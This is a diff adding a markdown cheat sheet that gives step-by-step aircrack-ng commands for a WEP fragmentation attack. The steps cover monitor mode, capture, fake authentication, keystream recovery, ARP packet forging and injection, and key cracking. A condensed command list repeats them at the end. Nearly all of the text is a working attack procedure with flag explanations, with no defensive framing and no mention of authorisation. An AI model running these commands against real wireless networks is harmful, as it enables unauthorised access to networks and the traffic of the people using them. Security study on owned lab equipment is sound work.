@@ -1,0 +1,81 @@
+# Fragmentation attack
+
+---
+
+`sudo airmon-ng start wlan0`
+
+`sudo airodump-ng wlan0`
+
+Select the bssid to use
+
+`sudo airodump-ng --bssid <bssid> -c <channel> -w fragmentation_attack wlan0`
+
+> -c : channel
+-w : file to write data
+wlan0 - interface in monitor mode
+
+Fake Authenticate with the access point
+
+`sudo aireplay-ng --fakeauth 0 -a <bssid> -h <your_mac> wlan0`
+
+![[fakeauth.png]]
+> -a : bssid of the access point
+-h : Your mac address. You can view it using: `macchanger --show`
+wlan0 : interface in monitor mode
+
+
+`sudo aireplay-ng --fragment -b <bssid> -h <your_mac> wlan0`
+
+> -b : bssid of the access point
+-h : Your mac address. You can view it using: `macchanger --show`
+wlan0 : interface in monitor mode
+
+![[fragment.png]]
+![[frag_save.png]]
+
+We will use the `.xor` file to generate a forged packet using packetforge-ng
+
+`packetforge-ng -0 -a <bssid> -h <your_mac> -k 255.255.255.255 -l 255.255.255.255 -y <xor_file> -w <file_name_to_save>`
+
+
+>-0 : Indicates you want a arp request packet generated
+-a : bssid of the access point
+-h : Your mac address. You can view it using: `macchanger --show`
+wlan0 : interface in monitor mode
+-y : Keystream we captured using fragmentation attack (.xor)
+-w : Packet we are gonna create 
+
+![[packetforge-ng.png]]
+
+Now we need to inject those ARP packets.
+
+`aireplay-ng -2 -r <file_created_in_packetforge>`
+
+![[data.png]]
+
+When the data reaches 10000 run this command on a new terminal
+
+`sudo aircrack-ng <capfile_generated_during_airmonng>`
+
+![[cracked.png]]
+
+---
+
+In short
+
+---
+
+
+> 1. `sudo airmon-ng start wlan0`
+> 2.  `sudo airodump-ng wlan0`
+>3.  `sudo airodump-ng --bssid <bssid> -c <channel> -w fragmentation_attack wlan0`
+
+> 1. `sudo aireplay-ng --fakeauth 0 -a <bssid> -h <your_mac> wlan0`
+
+> 1. `sudo aireplay-ng --fragment -b <bssid> -h <your_mac> wlan0`
+2. `packetforge-ng -0 -a <bssid> -h <your_mac> -k 255.255.255.255 -l 255.255.255.255 -y <xor_file> -w <file_name_to_save>`
+
+> 1. `aireplay-ng -2 -r <file_created_in_packetforge-ng>`
+2. `sudo aircrack-ng <capfile_generated_during_airmonng>`
+
+
